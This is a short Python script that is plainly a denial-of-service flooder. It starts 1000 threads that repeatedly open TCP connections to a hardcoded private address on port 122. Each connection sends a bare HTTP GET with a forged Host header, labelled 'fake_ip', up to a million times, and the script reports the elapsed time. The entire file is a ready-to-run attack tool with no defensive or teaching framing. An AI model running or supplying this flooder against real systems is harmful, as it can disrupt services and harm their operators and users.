import socket
import threading
import concurrent.futures
import time

target = '10.168.0.80'
fake_ip = '182.21.20.33'
port = 122

attack_num = 0


def attack():
    global attack_num
    while attack_num <= 1000000:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        attack_num += 1
        print(attack_num)

        s.close()



before = time.time()
for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()

#
# with concurrent.futures.ThreadPoolExecutor() as executor:
#     threads = list(range(0, 1000))
#     results = executor.map(attack, threads)
#     for result in results:
#         print(result)

after = time.time()
print('Duration: {}s'.format(round(after - before, 2)))
